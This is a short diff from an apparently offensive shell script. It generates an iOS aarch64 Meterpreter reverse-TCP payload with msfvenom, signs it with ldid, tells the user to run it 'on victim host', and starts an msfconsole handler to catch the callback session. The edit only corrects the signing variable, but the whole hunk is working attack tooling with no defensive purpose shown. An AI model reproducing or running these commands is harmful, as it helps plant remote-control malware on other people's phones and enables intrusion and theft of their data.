@@ -30,7 +30,7 @@ msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f m
 echo -e "$yellow //$white Trying to change permission"
 chmod +x $out
 echo -e "$yellow //$white Signing the payload"
-ldid -S out
+ldid -S $out
 echo -e "$yellow //$white Payload created, run it manually on victim host"
 echo -e "$yellow //$white Running msfconsole"
 msfconsole -qx "use exploit/multi/handler; set payload apple_ios/aarch64/meterpreter_reverse_tcp; set lhost $ip; set lport $port; set ExitOnSession false; run -j"
